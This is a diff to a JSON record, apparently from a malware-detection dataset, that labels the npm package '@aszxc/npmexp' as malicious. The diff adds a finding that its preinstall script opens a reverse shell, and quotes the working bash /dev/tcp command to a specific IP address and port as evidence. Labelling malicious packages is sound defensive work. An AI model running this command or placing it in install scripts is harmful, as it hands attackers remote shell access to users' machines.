@@ -2,7 +2,23 @@
   "package_name": "@aszxc/npmexp",
   "version": "1.0.1",
   "label": "malicious",
-  "behaviors": [],
+  "behaviors": [
+    {
+      "category": "backdoor_installation",
+      "summary": "Backdoor installation via preinstall script",
+      "details": "A preinstall script is used to establish a reverse shell connection to a remote server.",
+      "confidence": 0.9,
+      "evidence_apis": [],
+      "evidence_files": [
+        "INSTALL SCRIPT"
+      ],
+      "evidence_domains": [],
+      "evidence_commands": [
+        "bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'"
+      ],
+      "evidence_env_vars": []
+    }
+  ],
   "risk_vector": [
     "backdoor_installation"
   ],
@@ -10,5 +26,5 @@
     "model": "deepseek-coder-6.7b",
     "stage": "v2.0"
   },
-  "created_at": "2025-12-15T14:30:07.779574"
+  "created_at": "2025-12-15T16:21:22.473586"
 }
